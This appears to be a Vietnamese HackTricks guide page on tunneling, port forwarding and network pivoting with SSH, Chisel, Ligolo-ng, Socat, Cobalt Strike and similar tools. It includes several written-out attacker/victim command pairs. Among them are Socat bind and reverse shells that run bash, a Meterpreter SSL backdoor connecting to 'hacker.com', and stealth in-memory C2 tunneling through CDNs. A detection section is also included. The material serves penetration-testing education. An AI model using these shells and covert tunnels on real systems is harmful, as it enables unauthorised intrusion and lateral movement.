# Tunneling và Port Forwarding

{{#include ../banners/hacktricks-training.md}}

Để đưa dịch vụ HTTP hoặc TCP cục bộ ra ngoài thông qua relay công khai, xem [exposing local services to the internet](expose-local-to-the-internet.md). Chương này trình bày cách chuyển tiếp và pivot giữa các host.

## Mẹo về Nmap

> [!WARNING]
> Hỗ trợ proxy của Nmap chỉ giới hạn ở các kết nối TCP và không ảnh hưởng đến các lượt quét ping, cổng hoặc phát hiện hệ điều hành. Khi scanner nằm sau proxy SOCKS, hãy **tắt tính năng phát hiện host** (`-Pn`) và dùng **TCP connect scan** (`-sT`).<sup>[[5]](#references)</sup>

## **Bash**

**Host -> Jump -> InternalA -> InternalB**

Lệnh cuối sử dụng các tùy chọn `-u` và `-i` của Evil-WinRM để xác định tài khoản và host WinRM; cổng WinRM mặc định là 5985.<sup>[[4]](#references)</sup>

```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```

## **SSH**

OpenSSH có thể chuyển tiếp kết nối X11, các cổng TCP tùy ý và socket miền Unix qua kênh được mã hóa của nó.<sup>[[6]](#references)</sup>

Kết nối đồ họa SSH (X)

`-Y` bật chuyển tiếp X11 đáng tin cậy và `-C` yêu cầu nén dữ liệu được chuyển tiếp.<sup>[[6]](#references)</sup>

```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```

### Remote Port2Port

Mở Port mới trong SSH Server --> Port khác

Chuyển tiếp Remote (`-R`) lắng nghe trên SSH server và kết nối tới phía cục bộ; địa chỉ bind được chỉ định rõ ràng sẽ kiểm soát những giao diện nào có thể truy cập listener.<sup>[[6]](#references)</sup>

```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```

### Port2Port

Cổng cục bộ --> Máy chủ bị xâm nhập (SSH) --> Third_box:Port

Forwarding cục bộ (`-L`) lắng nghe trên client và kết nối đến đích từ phía máy chủ SSH.<sup>[[6]](#references)</sup>

```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```

### Port2hostnet (proxychains)

Cổng cục bộ --> Máy chủ bị xâm nhập (SSH) --> Bất cứ đâu

Dynamic forwarding (`-D`) tạo một listener SOCKS4/SOCKS5 cục bộ, nơi các kết nối được mở từ phía máy chủ từ xa.<sup>[[6]](#references)</sup>

```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```

### Multi-hop với ProxyJump

`-J`/`ProxyJump` kết nối đến mục tiêu thông qua một hoặc nhiều jump host, được phân tách bằng dấu phẩy. Các tùy chọn chuyển tiếp vẫn thuộc về kết nối SSH cuối cùng, vì vậy SOCKS listener bên dưới sẽ mở các đích từ `internal-target`, chứ không phải từ bastion đầu tiên. Cách này giúp tránh đăng nhập vào jump host rồi khởi chạy một SSH client thứ hai tại đó.<sup>[[6]](#references)</sup>

```bash
# Reach the final SSH server through two bastions
ssh -J user1@jump1:22,user2@jump2:22 user3@internal-target

# Create a local SOCKS proxy whose connections exit from internal-target
ssh -J user1@jump1,user2@jump2 -N -D 127.0.0.1:1080 user3@internal-target
```

Các tùy chọn dành riêng cho host của jump machine nên được đặt trong `~/.ssh/config`; cấu hình trên dòng lệnh dành cho đích đến sẽ không tự động được áp dụng cho các host trung gian.<sup>[[6]](#references)</sup>

### Reverse Port Forwarding

Cách này hữu ích để nhận reverse shells từ các host nội bộ qua DMZ đến host của bạn:

Cài đặt `GatewayPorts` trên server kiểm soát liệu remote forward có thể bind ra ngoài loopback hay không; mặc định là `no`.<sup>[[7]](#references)</sup>

```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```

### VPN-Tunnel

Ví dụ này chạy với quyền root và tạo các thiết bị tunnel trên cả hai máy. Server phải cho phép chuyển tiếp tun và tài khoản được chọn phải có quyền truy cập vào thiết bị tun; `PermitRootLogin yes` là một cách để sử dụng tài khoản `root` ở đây.<sup>[[6]](#references)[[7]](#references)</sup>\
`PermitRootLogin yes`\
`PermitTunnel yes`

```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip link set tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ip link set tun0 up #Activate the server side network interface
```

Bật forwarding ở phía Server

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```

Thiết lập một route mới ở phía client

```
route add -net 10.0.0.0/16 gw 1.1.1.1
```

> [!NOTE]
> **Bảo mật – Terrapin Attack (CVE-2023-48795)**  
> OpenSSH 9.6 bổ sung phần mở rộng strict-KEX để chống lại cuộc tấn công toàn vẹn dữ liệu ở giai đoạn đầu của transport trong Terrapin. Nếu có thể, hãy cập nhật cả hai đầu và làm theo hướng dẫn của nhà cung cấp đối với các triển khai cũ, thay vì cho rằng chỉ riêng phiên bản đã bảo vệ được kênh được forward.<sup>[[8]](#references)</sup>

## SSHUTTLE

Bạn có thể **tunnel** toàn bộ **traffic** qua **ssh** tới một **subnetwork** thông qua một host.\
Ví dụ: forward toàn bộ traffic đi tới 10.10.10.0/24

`sshuttle` cung cấp proxy trong suốt qua SSH và hỗ trợ chọn subnet cũng như dùng lệnh SSH tùy chỉnh như minh họa bên dưới.<sup>[[9]](#references)</sup>

```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```

Kết nối bằng khóa riêng tư

```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```

## Meterpreter

`portfwd` của Metasploit hỗ trợ chuyển tiếp cục bộ và từ xa, trong khi module proxy SOCKS được thiết kế để hoạt động với các route của session hoặc `autoroute` và mặc định lắng nghe trên cổng 1080 trong các ví dụ này.<sup>[[10]](#references)[[11]](#references)[[12]](#references)</sup>

### Port2Port

Cổng cục bộ --> Máy chủ bị xâm nhập (session đang hoạt động) --> Third_box:Cổng

```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```

### SOCKS

```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```

Một cách khác:

```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```

## Cobalt Strike

Beacon của Cobalt Strike có thể chuyển tiếp các kết nối SOCKS4a/SOCKS5 thông qua Beacon; `rportfwd` bind trên máy chủ đã bị xâm nhập, còn `rportfwd_local` khởi tạo kết nối đến đích từ client Cobalt Strike.<sup>[[13]](#references)[[14]](#references)</sup>

### SOCKS proxy

Mở một cổng trên Team Server tại các interface cần định tuyến lưu lượng qua Beacon.<sup>[[13]](#references)</sup>

```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```

### rPort2Port

> [!WARNING]
> Trong trường hợp này, **port được mở trên máy chủ Beacon**, không phải trên Team Server; lưu lượng được gửi đến Team Server rồi từ đó đến host:port được chỉ định.<sup>[[14]](#references)</sup>

```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```

Tài liệu hướng dẫn reverse-forwarding ghi nhận hành vi sau:<sup>[[14]](#references)</sup>

- Reverse port forward của Beacon được thiết kế để **tunnel lưu lượng đến Team Server, không dùng để relay giữa các máy riêng lẻ**.
- Lưu lượng được **tunnel bên trong lưu lượng C2 của Beacon**, bao gồm cả các liên kết P2P.
- Các port cao thường tránh được hạn chế đối với port đặc quyền, nhưng chính sách của hệ điều hành mục tiêu và các listener hiện có vẫn được áp dụng.

### rPort2Port local

> [!WARNING]
> Trong trường hợp này, **port được mở trên host chạy Beacon**, không phải trên Team Server, và **lưu lượng được gửi đến client Cobalt Strike** (không phải Team Server), rồi từ đó đến host:port được chỉ định.<sup>[[14]](#references)</sup>

```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```

## Overlay userspace Yggdrasil với yggstack

[Yggstack](https://github.com/yggdrasil-network/yggstack) kết nối vào mesh IPv6 được mã hóa của Yggdrasil mà không cần giao diện TUN hay quyền quản trị. Công cụ này cung cấp một listener SOCKS5 cục bộ để kết nối vào overlay và chuyển tiếp TCP theo cả hai hướng.<sup>[[64]](#references)</sup> Pivot phải kết nối được đến một peer đã cấu hình, đồng thời endpoint của operator cũng phải tham gia mesh để truy cập địa chỉ overlay của pivot.<sup>[[65]](#references)</sup>

Tạo cấu hình và thêm URI của một peer có thể kết nối được vào phần `Peers`, rồi chọn listener SOCKS hoặc chế độ phơi bày cổng từ xa.<sup>[[64]](#references)[[65]](#references)</sup> Chế độ sau sẽ phơi bày dịch vụ đang bind vào `127.0.0.1:8080` trên cổng `18080` của địa chỉ Yggdrasil của node, chứ không phải trên Internet thông thường. Trên một mesh công cộng, các node overlay khác có thể truy cập dịch vụ đã phơi bày, vì vậy kết nối peer không phải là ranh giới kiểm soát truy cập.<sup>[[64]](#references)[[66]](#references)</sup> Các lệnh bên dưới là những lần chạy thay thế của cùng một node.<sup>[[64]](#references)</sup>

```bash
./yggstack -genconf > yggdrasil.conf
# Add a peer URI to the Peers section of yggdrasil.conf first.
./yggstack -useconffile yggdrasil.conf -socks 127.0.0.1:1080
./yggstack -useconffile yggdrasil.conf -remote-tcp 18080:127.0.0.1:8080
```

Một agent Go có thể nhúng userspace stack thay vì khởi chạy một tiến trình `yggstack` riêng. ESET đã ghi nhận một triển khai tạo danh tính Ed25519 mới mỗi lần khởi động, làm thay đổi địa chỉ IPv6 overlay, đồng thời đặt `NodeInfo` rỗng và bật `NodeInfoPrivacy` để hạn chế metadata node bị tiết lộ. Nó giao tiếp với một endpoint HTTPS bên trong mesh và có thể hiển thị một TCP listener cục bộ qua địa chỉ overlay của nó.<sup>[[64]](#references)[[67]](#references)</sup>

Overlay có thể che khuất đích đến cuối cùng khỏi góc nhìn egress thông thường, nhưng không che được các kết nối peer hoặc địa chỉ IP nguồn mà các peer trực tiếp nhìn thấy. Yggdrasil không cung cấp tính ẩn danh.<sup>[[66]](#references)[[67]](#references)</sup> Xem [quyền riêng tư mạng và kết nối ẩn danh](../privacy/network-privacy-and-anonymous-connectivity.md) để hiểu sự khác biệt giữa truyền tải được mã hóa và tính ẩn danh.

## Tailcat: chuyển tiếp TCP userspace không cần tài khoản

Tailcat sử dụng data plane WireGuard/NAT-traversal/DERP của Tailscale mà không cần control plane của Tailscale. Nó không yêu cầu tài khoản Tailscale hoặc quyền quản trị viên, đồng thời không cài đặt route cho host hay thay đổi DNS. Khác với [Tailscale Serve/Funnel](expose-local-to-the-internet.md#tailscale-funnel--serve) hoặc [tailnet BOFScale chạy trong tiến trình](#bofscale---cdn-fronted-in-process-tailnet), máy chủ chia sẻ một *địa chỉ tailcat* qua kênh ngoài. Máy khách sử dụng địa chỉ đó để truy cập một cổng do node từ xa cung cấp.<sup>[[62]](#references)</sup>

Với một dịch vụ TCP đang lắng nghe trên cổng `4444` của node từ xa, hãy chạy `serve` trên node đó rồi chuyển địa chỉ được in ra cho `forward` trên máy khách. Theo mặc định, lệnh thứ hai bind vào `127.0.0.1:18080`, vì vậy một tiến trình cục bộ chỉ hỗ trợ socket TCP thông thường có thể kết nối đến cổng loopback đó, trong khi Tailcat chuyển lưu lượng đến cổng `4444` ở node từ xa.<sup>[[62]](#references)</sup> Các số cổng không có ý nghĩa đặc biệt đối với Tailcat.<sup>[[62]](#references)</sup>

```bash
# Remote node with a service on localhost:4444
tailcat serve 4444
# Client node; replace the placeholder with the address printed above
tailcat forward <tc-address> 18080:4444
```

Địa chỉ chứa public key WireGuard của máy chủ và, theo mặc định trong các bản phát hành hiện tại, một pre-shared key. Hãy xem đây là thông tin xác thực: máy chủ không giới hạn sẽ chấp nhận peer biết địa chỉ này. Địa chỉ tạm thời ngừng hoạt động khi máy chủ thoát. Khóa `default` đã lưu khiến `serve` thông thường tái sử dụng địa chỉ ổn định trong các lần chạy sau, vì vậy hãy kiểm tra thông báo khởi động và giới hạn client bằng `serve --allow` nếu địa chỉ có thể bị lộ.<sup>[[62]](#references)</sup>

Kết nối có thể dùng đường truyền UDP trực tiếp hoặc relay DERP. Điều này tránh yêu cầu một domain C2 riêng, nhưng không khiến hoạt động mạng biến mất.<sup>[[62]](#references)[[63]](#references)</sup>

## BOFScale - tailnet trong tiến trình, định tuyến qua CDN

[BOFScale](https://github.com/NetSPI/BOFscale) chạy một overlay Tailscale đã được sửa đổi bên trong implant C2 Windows mà không cài TUN driver hoặc service. Ba thành phần của nó là một BOF-PE `tailscaled` bất đồng bộ kiểu CGo `c-shared`, một BOF-PE C++ nhỏ giao tiếp với local API, và một cầu nối TCP-to-SOCKS5 bất đồng bộ `socksportfwd`.<sup>[[53]](#references)[[54]](#references)</sup>

### TS2021 và DERP tương thích với CDN

Tailscale thường dùng HTTP upgrade độc quyền cho control channel TS2021 dựa trên Noise và relay DERP. BOFScale giữ nguyên các luồng byte đó nhưng truyền chúng trong WebSocket RFC 6455, dùng `Sec-WebSocket-Protocol: ts2021` hoặc `derp`, để một origin Headscale/DERP do operator kiểm soát có thể nằm sau CDN chỉ chấp nhận WebSocket upgrade tiêu chuẩn. Client đã được vá thử lại TS2021 qua WebSocket sau HTTP `500`, thử lại DERP sau HTTP `426`, và khiến DERP WebSocket dialer tuân theo cấu hình proxy của host; BOF đặt `TS_DEBUG_DERP_WS_CLIENT=1` để bỏ qua lần thử đầu tiên vốn đã biết là sẽ thất bại.<sup>[[53]](#references)[[54]](#references)</sup>

CDN và origin proxy phải giữ nguyên WebSocket upgrade cho `/ts2021` và `/derp`, chuyển tiếp `/key` dưới dạng HTTP thông thường, đồng thời tắt timeout đọc/ghi nội bộ vì các phiên relay có thể mở vô thời hạn. Cấu hình Headscale được cung cấp bật `verify_clients`, chỉ công bố DERP map nhúng của operator, và để trống `derp.urls` nhằm ngăn việc fallback sang các relay do Tailscale vận hành.<sup>[[53]](#references)[[54]](#references)</sup>

### Daemon trong tiến trình và điều khiển qua named pipe

Trừ khi bị ghi đè, entry point BOF khởi chạy `tailscaled` với `-tun=userspace-networking`, `-state mem:`, và `-no-logs-no-support`, sau đó tạo một pipe có tên UUID. Nó chuyển hướng stdout/stderr của Go qua một OS pipe đến Beacon output API, nên toàn bộ daemon và Go runtime vẫn nằm trong bộ nhớ nhưng state và log không được ghi vào thư mục Tailscale.<sup>[[53]](#references)[[54]](#references)</sup>

Client nhẹ tái tạo local API HTTP/1.0 của Tailscale qua pipe đó. Nó mở pipe bằng `SECURITY_SQOS_PRESENT | SECURITY_IMPERSONATION` vì lớp `safesocket` của daemon giả danh pipe client, gửi `Tailscale-Cap: 125`, và ánh xạ local API thành các thao tác `up`, `down`, `status`, quảng bá route và shutdown.<sup>[[53]](#references)[[54]](#references)</sup>

> [!WARNING]
> Không unload Go BOF-PE được map thủ công sau khi yêu cầu daemon shutdown: các goroutine của runtime và garbage collector có thể tiếp tục thực thi từ vùng nhớ mà loader đã unmap. Hãy chạy `tailscaled` trong một tiến trình dùng một lần và chấm dứt tiến trình đó để dọn dẹp hoàn toàn.<sup>[[54]](#references)</sup>

### Chuyển tiếp lưu lượng khởi tạo từ host qua SOCKS5 userspace

Kết nối tailnet đi vào và các subnet route được quảng bá hoạt động bên trong userspace network stack, nhưng các tiến trình thông thường trên host bị xâm nhập không có OS route vào overlay. Vì vậy, `socksportfwd` lắng nghe trên một TCP port hướng đến victim, thương lượng SOCKS5 `NO AUTH` với listener `0.0.0.0:1080` của daemon, gửi `CONNECT` đến một đích tailnet và chuyển tiếp dữ liệu theo cả hai chiều một cách bất đồng bộ. Khi đích là tên MagicDNS, nó dùng `ATYP_DOMAIN`, nhờ đó `tailscaled` phân giải tên mà không để Windows resolver nhìn thấy tên đó.<sup>[[53]](#references)[[54]](#references)</sup>

Luồng thao tác tối giản của operator được trình bày bên dưới; cả node operator lẫn implant đều phải dùng binary đã được vá vì Tailscale nguyên bản không thể đi qua thiết kế CDN này.<sup>[[53]](#references)[[54]](#references)</sup>

```bash
HEADSCALE_HOSTNAME=<cdn-hostname> docker compose up
# Start tailscaled as an asynchronous BOF and copy its printed pipe name
tailscaled
tailscale --socket '\\.\pipe\<uuid>' up --auth-key <key> --login-server https://<cdn-hostname>
tailscale --socket '\\.\pipe\<uuid>' set --advertise-routes <victim-cidr>
socksportfwd --t <operator-magicdns-name> --tp 8888 --p 8888
```

Local forward có thể tách listener xác thực hiển thị bên ngoài khỏi công cụ relay: buộc một máy xác thực đến cổng đã bind trên host bị xâm nhập, chuyển tiếp lưu lượng qua tailnet đến `ntlmrelayx`, rồi relay tiếp đến AD CS, LDAP, HTTP, SMB hoặc một target tương thích khác. Xem [WebDAV NTLM coercion](../windows-hardening/ntlm/places-to-steal-ntlm-creds.md#webdav-auth-coercion--credential-validation-via-davclntdlldavsetcookie) và [ESC8 relay to AD CS](../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints--esc8) để biết các giai đoạn cụ thể của từng lỗ hổng; BOFScale chỉ đảm nhiệm việc truyền tải.<sup>[[54]](#references)</sup>

### Phát hiện

Tìm kiếm sự kết hợp của các dấu hiệu thay vì chỉ dựa vào một dấu hiệu yếu: Go runtime trong một tiến trình vốn không thường được viết bằng Go, UUID pipe với SDDL dễ dãi `D:(A;;GA;;;WD)`, SOCKS listener `0.0.0.0:1080` bất thường và các kết nối TLS WebSocket kéo dài đến địa chỉ CDN. Khi kiểm tra TLS, hãy đánh dấu `Sec-WebSocket-Protocol: derp` hoặc `ts2021` nếu tiến trình sở hữu không phải là dịch vụ `tailscaled` được cấp phép. Các quy tắc `bofscale.yar` của repository cung cấp chữ ký bộ nhớ cho cả ba thành phần BOF-PE.<sup>[[53]](#references)[[54]](#references)</sup>

## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

Dự án cung cấp các endpoint web tunnel như `tunnel.aspx`, `tunnel.ashx`, `tunnel.jsp` và `tunnel.php`; hãy upload một endpoint được hỗ trợ trước khi khởi chạy proxy cục bộ.<sup>[[15]](#references)</sup>

```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```

## Chisel

Bạn có thể tải xuống từ trang releases của [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
Chisel truyền tải lưu lượng TCP/UDP qua HTTP bằng kết nối được bảo vệ bằng SSH; hãy dùng các bản dựng client/server tương thích và kiểm tra cú pháp lệnh của bản phát hành đã chọn.<sup>[[16]](#references)</sup>

### socks

```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```

### Port forwarding

```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```

## wstunnel

[`wstunnel`](https://github.com/erebe/wstunnel) chuyển tiếp tĩnh hoặc động qua WebSocket, HTTP/2 hoặc WebTransport (HTTP/3 qua QUIC). Các bản dựng hiện tại hỗ trợ TCP, UDP, Unix socket, stdio, SOCKS5, proxy HTTP và trình lắng nghe transparent proxy trên Linux ở cả chế độ forward lẫn reverse.<sup>[[52]](#references)</sup>

### Reverse SOCKS5 pivot

Chạy server trên máy của kẻ tấn công và để pivot kết nối ra ngoài bằng `-R`. Theo hướng này, trình lắng nghe SOCKS5 được tạo trên **server**, còn các kết nối được yêu cầu bắt nguồn từ mạng của **client/pivot**.<sup>[[52]](#references)</sup>

```bash
# Attacker: use a certificate valid for pivot.example
wstunnel server --tls-certificate cert.pem --tls-private-key key.pem wss://0.0.0.0:443

# Pivot: expose an attacker-side, loopback-only SOCKS5 listener
wstunnel client --tls-verify-certificate \
  -R 'socks5://127.0.0.1:1080' wss://pivot.example:443

# Attacker
proxychains nmap -n -Pn -sT -p 445,3389 10.10.10.0/24
```

Reverse static forward sử dụng cùng hướng. Ví dụ, lệnh sau đưa `10.10.10.20:445`, có thể truy cập thông qua pivot, ra cổng loopback `8445` của attacker:<sup>[[52]](#references)</sup>

```bash
wstunnel client --tls-verify-certificate \
  -R 'tcp://127.0.0.1:8445:10.10.10.20:445' wss://pivot.example:443
```

### Chi tiết về lưu lượng đi ra và truyền tải

- Thêm `-p http://user:pass@proxy:8080` vào client để đi qua HTTP proxy tường minh. Dùng `socks5h://127.0.0.1:1080` trong các client như `curl` (hoặc bật DNS qua proxy trong ứng dụng) để phân giải tên nội bộ ở phía bên kia tunnel, thay vì làm lộ chúng cho trình phân giải cục bộ.<sup>[[52]](#references)</sup>
- `wss://` chọn WebSocket được bảo vệ bằng TLS. Client `https://` chọn HTTP/2, nhưng việc buffering hoặc chuyển đổi sang HTTP/1 bởi reverse proxy/CDN thường làm hỏng luồng hai chiều; khi kiểm thử chế độ này, hãy cho phép truy cập trực tiếp đến máy chủ wstunnel.<sup>[[52]](#references)</sup>
- `wts://` chọn WebTransport qua QUIC. Khởi chạy máy chủ với `--enable-webtransport` (hoặc URL lắng nghe `wts://`) và cho phép UDP trên cổng lắng nghe. Chế độ này không thể đi qua HTTP `CONNECT` proxy thông thường vì proxy đó truyền tải TCP.<sup>[[52]](#references)</sup>

> [!WARNING]
> Dự án upstream cảnh báo không nên xem chứng chỉ self-signed tích hợp sẵn là biện pháp bảo vệ quyền riêng tư. Ưu tiên dùng chứng chỉ tùy chỉnh hợp lệ cùng với `--tls-verify-certificate` (hoặc mTLS), chỉ để các proxy listener lắng nghe trên loopback trừ khi chủ đích cho phép truy cập từ xa, và tunnel các giao thức vốn đã bảo mật khi cần tính bảo mật.<sup>[[52]](#references)</sup>

## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

Tài liệu quickstart của Ligolo-ng hướng dẫn cách tạo giao diện TUN trên proxy, xác thực fingerprint chứng chỉ của agent và thiết lập route cho mạng được tunnel.<sup>[[17]](#references)</sup>

### Tunneling

```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```

### Binding và Listening trên Agent

Ligolo-ng có thể tạo listener trên agent để chuyển tiếp đến một địa chỉ phía proxy; dải dành riêng `240.0.0.0/4` có thể được định tuyến để truy cập các dịch vụ cục bộ trên agent.<sup>[[18]](#references)[[19]](#references)</sup>

```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```

### Truy cập các cổng cục bộ của Agent

```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```

## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Rpivot khởi tạo reverse tunnel từ nạn nhân và cung cấp proxy SOCKS4 trên địa chỉ loopback của attacker; README cũng mô tả thông tin xác thực và các tùy chọn hash của NTLM-proxy.<sup>[[20]](#references)</sup>

```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```

Pivot thông qua **NTLM proxy**

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```

## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

Socat kết hợp các loại địa chỉ như `TCP-LISTEN`, `EXEC`, `SOCKS4A`, `OPENSSL` và `PROXY`; các ví dụ bên dưới kết hợp những endpoint được tài liệu hóa này.<sup>[[21]](#references)</sup>

### Bind shell

```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```

### Reverse shell

```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```

### Port2Port

```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```

### Port2Port qua socks

```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```

### Meterpreter qua SSL Socat

```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```

Bạn có thể đi qua một **proxy không cần xác thực** bằng kiểu địa chỉ `PROXY` được socat ghi nhận, bằng cách chạy dòng này thay cho dòng cuối cùng trong console của nạn nhân.<sup>[[21]](#references)</sup>

```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```

[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### Đường hầm Socat SSL

**/bin/sh console**

Tạo chứng chỉ ở cả hai phía: Client và Server

```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```

### Remote Port2Port

Kết nối cổng SSH cục bộ (22) với cổng 443 trên máy chủ của attacker

```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```

## Plink.exe

Plink là công cụ kết nối dòng lệnh của PuTTY, có các tùy chọn chuyển tiếp SSH tương tự `ssh`.<sup>[[22]](#references)</sup>

Dùng `-P` viết hoa để chỉ định cổng SSH. Tùy chọn `-pw` được giữ lại để tương thích nhưng làm lộ mật khẩu trong danh sách tiến trình; nếu có thể, hãy ưu tiên xác thực bằng khóa hoặc dùng `-pwfile`.<sup>[[22]](#references)[[23]](#references)</sup>

